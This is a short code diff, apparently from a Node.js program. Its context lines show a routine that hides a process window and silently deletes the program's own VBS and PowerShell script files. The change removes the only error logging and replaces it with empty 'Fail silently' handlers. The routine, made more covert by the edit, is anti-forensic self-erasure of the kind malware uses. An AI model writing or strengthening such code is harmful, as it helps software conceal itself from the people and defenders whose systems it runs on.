@@ -66,7 +66,7 @@ del "${vbsScriptPath}"
     }).unref();
 
   } catch (error) {
-    console.error("Erro ao agendar autoexclusão silenciosa:", error);
+    // Fail silently
   }
 }
 
@@ -126,9 +126,11 @@ Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyConti
       windowsHide: true,
     }, (error) => {
       if (error) {
+        // Fail silently
       }
     });
 
   } catch (error) {
+    // Fail silently
   }
 }
